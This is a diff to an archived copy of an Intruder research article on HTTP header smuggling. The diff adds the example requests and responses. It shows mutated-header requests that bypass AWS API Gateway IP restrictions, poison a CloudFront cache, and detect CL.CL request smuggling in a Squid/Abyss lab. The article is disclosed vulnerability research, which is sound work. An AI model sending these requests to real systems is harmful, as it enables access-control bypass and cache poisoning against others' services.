@@ -2,38 +2,40 @@
 type: Article
 title: "Practical HTTP Header Smuggling: Sneaking Past Reverse Proxies to Attack AWS and Beyond"
 resource: "https://www.intruder.io/research/practical-http-header-smuggling"
-tags: [article, webseclist-reference, en, intruder-io]
+tags: [article, webseclist-reference, intruder-io]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-09T01:30:50+00:00"
+  at: "2026-08-10T13:36:27+00:00"
 status: stable
-stale_after: 2027-08-09
+stale_after: 2027-08-10
 sources:
   - id: original
     resource: "https://www.intruder.io/research/practical-http-header-smuggling"
     title: "Practical HTTP Header Smuggling: Sneaking Past Reverse Proxies to Attack AWS and Beyond"
+  - id: capture
+    resource: "https://web.archive.org/web/20211111200543/https://www.intruder.io/research/practical-http-header-smuggling"
 also_at: []
 authors: []
 canonical_url: ""
 cited_by:
   - "2021.md:12"
 commit: ""
-content_sha256: 84169def5fbd5ac7a4295d086dd71bf2524e712cd353f7daadaf445d58d6e7b3
+content_sha256: d0ff020f830ae415d0db7a322678c6bcac2b29e38f1b4e87e9bf1c33332668a7
 depth: full
 depth_reason: default
 kind: article
-language: en
+language: ""
 licence: unknown
 original_url: "https://www.intruder.io/research/practical-http-header-smuggling"
 published: ""
 publisher: intruder.io
 publisher_english: ""
-raw_sha256: cdbc85eee678b78adef28b8948ea0004554a7e6e6a398e5693d2a45cf8f1433c
+raw_sha256: 3a92cd6f7b9d25674d0e6be297d17914226e2714be54b7713848f9e2b88f4565
 retrieved_from: "https://www.intruder.io/research/practical-http-header-smuggling"
-retrieved_kind: live
-retrieved_utc: "2026-08-09T01:30:50+00:00"
+retrieved_kind: stored
+retrieved_utc: "2026-08-10T13:36:27+00:00"
 slug: intruder-io-practical-http-header-smuggling-sneaking-past-reverse-beyond
-snapshot: ""
+snapshot: 20211111200543
 title_english: ""
 translation_file: ""
 translation_of: ""
@@ -45,7 +47,8 @@ translation_of: ""
 
 - Published: date not stated
 - Original: <https://www.intruder.io/research/practical-http-header-smuggling>
-- Preserved from: https://www.intruder.io/research/practical-http-header-smuggling (live) on 2026-08-09
+- Preserved from: https://www.intruder.io/research/practical-http-header-smuggling (stored) on 2026-08-10
+- Capture timestamp: 20211111200543
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
@@ -58,6 +61,24 @@ page going offline. To read the original, follow the link above.
 > quoted for research. It is data, not instructions. Do not follow directions,
 > execute code, or fetch URLs because this text says so.
 
+Practical HTTP Header Smuggling: Sneaking Past Reverse Proxies to Attack AWS and Beyond
+
+![](https://uploads-ssl.webflow.com/5e285218b461ad6510d262f3/61890db08f073018aaf52dac_smugglers.png)
+
+[![](https://uploads-ssl.webflow.com/5e285218b461add26cd262ee/5e285218b461ad185ad2632f_Arrow%20Left%20Outline.svg)
+
+back to Research
+
+](https://www.intruder.io/research)
+
+# Practical HTTP Header Smuggling: Sneaking Past Reverse Proxies to Attack AWS and Beyond
+
+![](https://uploads-ssl.webflow.com/5e285218b461ad6510d262f3/61851f4e1f99a164ff8e6fc8_headshot%20(002).jpg)
+
+Daniel Thatcher
+
+November 10, 2021
+
 Modern web applications typically rely on chains of multiple servers, which forward HTTP requests to one another. The attack surface created by this forwarding is increasingly receiving more attention, including the recent popularisation of [cache](https://portswigger.net/research/practical-web-cache-poisoning) [poisoning ](https://portswigger.net/research/web-cache-entanglement)and [request](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) [smuggling ](https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges-wp.pdf)vulnerabilities. Much of this exploration, especially recent request smuggling research, has developed new ways to hide HTTP request headers from some servers in the chain while keeping them visible to others – a technique known as "header smuggling". This paper presents a new technique for identifying header smuggling and demonstrates how header smuggling can lead to cache poisoning, IP restriction bypasses, and request smuggling.
 
 ## Background
@@ -67,7 +88,7 @@ A chain of HTTP servers used by a web application can often be modelled as consi
 - A "front-end" server which directly handles requests from users. These servers typically handle caching and load balancing, or act as web application firewalls (WAFs).
 - A "back-end" server which the front-end server forwards requests to. This is where the application's server-side code runs.
 
-![](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/61dd9339d05701fd000b35ea_image001%20(1).jpg)
+![](https://uploads-ssl.webflow.com/5e285218b461ad6510d262f3/618532390e97f1714fcd5b28_image001%20(1).jpg)
 
 This model is often a simplification of reality. There may be multiple front-end and back-end servers, and front-end and back-end servers are often themselves chains of multiple servers. However, this model is sufficient to understand and develop the attacks presented in this article, as well as most of the recent research into attacking chains of servers.
 
@@ -80,6 +101,10 @@ Using header smuggling, it is possible to bypass this filtering and send informa
 The method developed by this research to identify header smuggling vulnerabilities determines whether a "mutation" can be applied to a header to allow it to be snuck through to a back-end server without being recognised or processed by a front-end server. A mutation is simply an obfuscation of a header. The following examples are mutated versions of the "Content-Length" header:
 
 ```http
+Content-Length : 0
+Content-Length abcd: 0
+Content_Length: 0
+[\r]Content-Length: 0
 
 ```
 
@@ -88,12 +113,17 @@ This method relies on the fact that most web servers will return an error when s
 ***Request***
 
 ```http
+GET / HTTP/1.1
+Host: example.com
+Content-Length: z
 
 ```
 
 ***Response***
 
 ```http
+HTTP/1.1 400 Bad Request
+[…]
 
 ```
 
@@ -102,24 +132,36 @@ The methodology also relies on comparing the responses when valid and invalid va
 ***Request***
 
 ```http
+GET / HTTP/1.1
+Host: example.com
+Content-Length: 0
 
 ```
 
 ***Response***
 
 ```http
+HTTP/1.1 200 OK
+Content-Length: 1256
+[…]
 
 ```
 
 ***Request***
 
 ```http
+GET / HTTP/1.1
+Host: example.com
+Content-Length: z
 
 ```
 
 ***Response***
 
 ```http
+HTTP/1.1 400 Bad Request
+Content-Length: 349
+[…]
 
 ```
 
@@ -130,24 +172,36 @@ This server chain allows headers to be smuggled through to the back-end by appen
 ***Request***
 
 ```http
+GET / HTTP/1.1
+Host: example.com
+Content-Length abcd: 0
 
 ```
 
 ***Response***
 
 ```http
+HTTP/1.1 200 OK
+Content-Length: 1256
+[…]
 
 ```
 
 ***Request***
 
 ```http
+GET / HTTP/1.1
+Host: example.com
+Content-Length abcd: z
 
 ```
 
 ***Response***
 
 ```http
+HTTP/1.1 502 Bad Gateway
+Content-Length: 50
+[…]
 
 ```
 
@@ -158,24 +212,36 @@ Secondly, the same response is returned when a valid value is included in each h
 ***Request***
 
 ```http
+GET / HTTP/1.1
+Host: example.com
+Content-Length: 0
 
 ```
 
 ***Response***
 
 ```http
+HTTP/1.1 200 OK
+Content-Length: 1256
+[…]
 
 ```
 
 ***Request***
 
 ```http
+GET / HTTP/1.1
+Host: example.com
+Content-Length abcd: 0
 
 ```
 
 ***Response***
 
 ```http
+HTTP/1.1 200 OK
+Content-Length: 1256
+[…]
 
 ```
 
@@ -186,24 +252,36 @@ The final important thing to notice is that an invalid value in each header caus
 ***Request***
 
 ```http
+GET / HTTP/1.1
+Host: example.com
+Content-Length: z
 
 ```
 
 ***Response***
 
 ```http
+HTTP/1.1 400 Bad Request
+Content-Length: 349
+[…]
 
 ```
 
 ***Request***
 
 ```http
+GET / HTTP/1.1
+Host: example.com
+Content-Length abcd: z
 
 ```
 
 ***Response***
 
 ```http
+HTTP/1.1 502 Bad Gateway
+Content-Length: 50
+[…]
 
 ```
 
@@ -220,6 +298,31 @@ While scanning across bug bounty programs, I noticed that APIs created using AWS
 API Gateway allows you to limit API access to certain IP addresses by using a [resource policy](https://aws.amazon.com/premiumsupport/knowledge-center/api-gateway-resource-policy-access/) such as the following:
 
 ```http
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Effect": "Allow",
+            "Principal": "*",
+            "Action": "execute-api:Invoke",
+            "Resource": "arn:aws:execute-api:eu-west-2:********2087:uiv82new6b/*/*/*"
+        },
+        {
+            "Effect": "Deny",
+            "Principal": "*",
+            "Action": "execute-api:Invoke",
+            "Resource": "arn:aws:execute-api:eu-west-2:********2087:uiv82new6b/*/*/*",
+            "Condition": {
+                "NotIpAddress": {
+                    "aws:SourceIp": [
+                        "1.2.3.4",
+                        "10.0.0.0/8"
+                    ]
+                }
+            }
+        }
+    ]
+}
 
 ```
 
@@ -228,12 +331,20 @@ This policy limits access to only accept requests from the IP address 1.2.3.4 (w
 ***Request***
 
 ```http
+GET /dev/a HTTP/1.1
+Host: uiv82new6b.execute-api.eu-west-2.amazonaws.com
+[…]
 
 ```
 
 ***Response***
 
 ```http
+HTTP/1.1 403 Forbidden
+Content-Type: application/json
+[…]
+
+{"Message":"User: anonymous is not authorized to perform: execute-api:Invoke on resource: arn:aws:execute-api:eu-west-2:********2087:uiv82new6b/dev/GET/a with an explicit deny"}
 
 ```
 
@@ -242,12 +353,21 @@ Unsurprisingly, simply adding the "X-Forwarded-For" header to a request was no m
 ***Request***
 
 ```http
+GET /dev/a HTTP/1.1
+Host: uiv82new6b.execute-api.eu-west-2.amazonaws.com
+[…]
 
 ```
 
 ***Response***
 
 ```http
+HTTP/1.1 403 Forbidden
+Content-Type: application/json
+X-Forwarded-For: 10.0.0.1
+[…]
+
+{"Message":"User: anonymous is not authorized to perform: execute-api:Invoke on resource: arn:aws:execute-api:eu-west-2:********2087:uiv82new6b/dev/GET/a with an explicit deny"}
 
 ```
 
@@ -256,12 +376,21 @@ However, when applying a mutation which allows header smuggling to this header, 
 ***Request***
 
 ```http
+GET /dev/a HTTP/1.1
+Host: uiv82new6b.execute-api.eu-west-2.amazonaws.com
+X-Forwarded-For abcd: 10.0.0.1
+[…]
 
 ```
 
 ***Response***
 
 ```http
+HTTP/1.1 201 Created
+Content-Type: application/json
+[…]
+
+A
 
 ```
 
@@ -270,12 +399,21 @@ This allows IP restrictions to be bypassed, but in practical situations it might
 ***Request***
 
 ```http
+GET /dev/a HTTP/1.1
+Host: uiv82new6b.execute-api.eu-west-2.amazonaws.com
+X-Forwarded-For abcd: z
+[…]
 
 ```
 
 ***Response***
 
 ```http
+HTTP/1.1 201 Created
+Content-Type: application/json
+[…]
+
+A
 
 ```
 
@@ -298,24 +436,37 @@ I setup two APIs using API Gateway – one "victim" API and one "attacker" API:
 ***Request***
 
 ```http
+GET /message HTTP/1.1
+Host: victim.i.long.lat
 
 ```
 
 ***Response***
 
 ```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+[…]
+
+{"data":"important","message":"important data returned"}
 
 ```
 
 ***Request***
 
 ```http
+GET /message HTTP/1.1
+Host: attacker.i.long.lat
 
 ```
 
 ***Response***
 
 ```http
+HTTP/1.1 200 OK
+[…]
+
+Poisoned!
 
 ```
 
@@ -324,42 +475,63 @@ The interesting behaviour appeared when including a mutated "Host" header alongs
 ***Request***
 
 ```http
+GET /message HTTP/1.1
+Host: victim.i.long.lat
+Host abcd: attacker.i.long.lat
 
 ```
 
 ***Response***
 
 ```http
+HTTP/1.1 200 OK
+[…]
+
+Poisoned!
 
 ```
 
 API gateway was returning the response from the API specified in the mutated "Host" header. This is in contrast to the behaviour of most web servers, which will not view the mutated "Host" header as a "Host" header and instead take the host from the regular "Host" header. This becomes interesting when such a server is acting as a cache in front of API gateway, as it will cache the result of the above request as though it was a request for "victim.i.long.lat", even though the response is from the "attacker.i.long.lat" API.
 
-![](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/61dd9339d05701b03f0b35eb_image002%20(1).jpg)
+![](https://uploads-ssl.webflow.com/5e285218b461ad6510d262f3/61854e8a2271260bd262d238_image002%20(1).jpg)
 
 To demonstrate this, I setup [CloudFront](https://aws.amazon.com/cloudfront/) in front of API Gateway with the "AllViewer" request policy, which causes all headers to be forwarded. Sending the above request, and then requesting "https://victim.i.long.lat/a" shows that the response from the attacker's API has been stored in the cache for the victim's API:
 
 ***Request***
 
 ```http
+GET /message HTTP/1.1
+Host: victim.i.long.lat
+Host abcd: attacker.i.long.lat
 
 ```
 
 ***Response***
 
 ```http
+HTTP/1.1 200 OK
+[…]
+
+Poisoned!
 
 ```
 
 ***Request***
 
 ```http
+GET /message HTTP/1.1
+Host: victim.i.long.lat
 
 ```
 
 ***Response***
 
 ```http
+HTTP/1.1 200 OK
+Age: 3
+[…]
+
+Poisoned!
 
 ```
 
@@ -371,13 +543,13 @@ This cache poisoning is rather easy to exploit as an attacker can setup their ow
 
 At Black Hat USA 2020 Amit Klein presented a request smuggling based on 2 "Content-Length" headers ("CL.CL" request smuggling). The bug could be triggered when [Squid ](http://www.squid-cache.org/)was used as a reverse proxy in front of the [Abyss web server](https://aprelium.com/abyssws/) using the following requests sent in the same connection:
 
-![](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/61dd9339d0570111670b35ee_Image%201.JPG)
+![](https://uploads-ssl.webflow.com/5e285218b461ad6510d262f3/618552e4319ab19407f29777_Image%201.JPG)
 
 The first request, shown in green, contains two "Content-Length" headers – 1 mutated and the other unmutated. Squid will only parse the unmutated header, and will take the length of the first request's body to be 33 bytes, which is shown in blue. Squid then takes the second request to be the one shown in red – a "GET" request to "/doesntexist".
 
 Abyss on the other hand will parse both the mutated and unmutated "Content-Length" headers, and takes the values of 0 bytes from the mutated header. It therefore thinks that the second request is the one which starts in blue – a "GET" request to "/a.html".
 
-![](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/61dd9339d057011c950b35ed_image003%20(1).jpg)
+![](https://uploads-ssl.webflow.com/5e285218b461ad6510d262f3/61854fb1f868b5733c6778d9_image003%20(1).jpg)
 
 The total effect of this is that Abyss responds with the content for "/a.html", and Squid caches this response for the path "/doesntexist", giving cache poisoning.
 
@@ -390,6 +562,13 @@ James Kettle's research which popularised request smuggling presented a simple m
 An attempt to do the same with CL.CL request smuggling might look similar to the following:
 
 ```http
+POST /b.shtml HTTP/1.1
+Host: squid01.rslab
+Connection: Keep-Alive
+Content-Length: 0
+Content-Length abcde: 1
+
+z
 
 ```
 
@@ -408,12 +587,20 @@ First, send a "baseline" request to the target system with the pair of "Content-
 ***Request***
 
 ```http
+POST /b.shtml HTTP/1.1
+Host: squid01.rslab
+Connection: Keep-Alive
+Content-Length: 0
+Content-Length abcd: 0
 
 ```
 
 ***Response***
 
 ```http
+HTTP/1.1 200 OK
+Content-Length: 86
+[…]
 
 ```
 
@@ -422,24 +609,40 @@ The next step is to send the same request two times more - once with a junk valu
 ***Request***
 
 ```http
+POST /b.shtml HTTP/1.1
+Host: squid01.rslab
+Connection: Keep-Alive
+Content-Length: z
+Content-Length abcd: 0
 
 ```
 
 ***Response***
 
 ```http
+HTTP/1.1 411 Length Required
+Content-Length: 4213
+[…]
 
 ```
 
 ***Request***
 
 ```http
+POST /b.shtml HTTP/1.1
+Host: squid01.rslab
+Connection: Keep-Alive
+Content-Length: 0
+Content-Length abcd: z
 
 ```
 
 ***Response***
 
 ```http
+HTTP/1.1 400 Bad Request
+Content-Length: 338
+[…]
 
 ```
 
@@ -455,12 +658,19 @@ This can be achieved by sending a request with a single, unmutated "Content-Leng
 ***Request***
 
 ```http
+POST /b.shtml HTTP/1.1
+Host: squid01.rslab
+Connection: Keep-Alive
+Content-Length: z
 
 ```
 
 ***Response***
 
 ```http
+HTTP/1.1 411 Length Required
+Content-Length: 4213
+[…]
 
 ```
 
@@ -480,9 +690,7 @@ These scripts are configured to run against my lab environment using Squid and A
 
 ## Tooling
 
-Once a mutation which allows header smuggling has been identified, the next step is to find an interesting header to sneak through to the back-end. Sometimes you may know a header you wish try, however, there is often no obvious choice. To assist with this second case, as well as to help find mutations which lead to header smuggling, I am releasing a fork of James Kettle's [Param Miner Burp Suite extension](https://github.com/PortSwigger/param-miner), which can be found [here](https://github.com/intruder-io/param-miner). **
-
-*Update: these changes have now been merged into *[*Param Miner*](https://github.com/PortSwigger/param-miner)*, and you can play with the new functionality by downloading Param Miner from the BApp store.*
+Once a mutation which allows header smuggling has been identified, the next step is to find an interesting header to sneak through to the back-end. Sometimes you may know a header you wish try, however, there is often no obvious choice. To assist with this second case, as well as to help find mutations which lead to header smuggling, I am releasing a fork of James Kettle's [Param Miner Burp Suite extension](https://github.com/PortSwigger/param-miner), which can be found [here](https://github.com/intruder-io/param-miner).
 
 This fork adds two new pieces of functionality. The first is a scan which uses the methodology I've described to identify mutations which lead to header smuggling. The second is an option when guessing headers which will cause the extension to automatically identify header smuggling mutations, and then also guess headers using these mutations.
 
@@ -512,24 +720,10 @@ I would like to thank the AWS security team, and in particular Dan Urson, for th
 
 3. You may notice that this logic can be used to make timeout-based detections safe for CL.CL request smuggling. As some vulnerable setups, including the Squid and Abyss setup, will not produce a timeout, I chose to use the purely error-based approach presented here.
 
-## Other research articles
+![](https://uploads-ssl.webflow.com/5e285218b461ad6510d262f3/61851f4e1f99a164ff8e6fc8_headshot%20(002).jpg)
 
-[![In GUID We Trust](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/634580968ca941acf32e6263_blog_post_banner.avif) ### In GUID We Trust GUIDs (often called UUIDs) are widely used in modern web applications. However, seemingly very few penetration testers and bug bounty hunters are aware of the different versions of GUIDs and the security issues associated with using the wrong one.](https://www.intruder.io/research/in-guid-we-trust)
+**Author: **
 
-[
+Daniel Thatcher
 
-![Simple Bugs in SAML Apps - Oracle Commerce Cloud](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/67c1c57a7e439be207763025_saml_xxe-sq.avif)
-
-### Simple Bugs in SAML Apps - Oracle Commerce Cloud
-
-In July 2023, while spending time hacking a US shipping vendor’s environment, I discovered an XXE (XML External Entity) vulnerability in the Oracle Commerce Cloud SAML login flow which allowed an attacker to forge server-side requests (SSRF) via an external DTD. In this post, I outline how I found it, the methods I used, and the disclosure process.
-
-](https://www.intruder.io/research/simple-bugs-in-saml-apps---oracle-commerce-cloud)
-
-[
-
-![Secrets in your Bundle(.js) - The Gift Attackers Always Wanted](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/693165ea2fb1457030baa3c4_2025%20-%20Secret%20Detection%20for%20Intruder%20blog.avif)
-
-### Secrets in your Bundle(.js) - The Gift Attackers Always Wanted
-
-Our scan of 5M apps uncovered 42k+ tokens in JavaScript bundles, from code repo tokens to project management API keys. Learn why traditional scanners miss them, and how Intruder’s new secrets detection method catches what others can’t.
+Daniel Thatcher is a researcher and penetration tester at Intruder. His research focuses on discovering new techniques in application security.
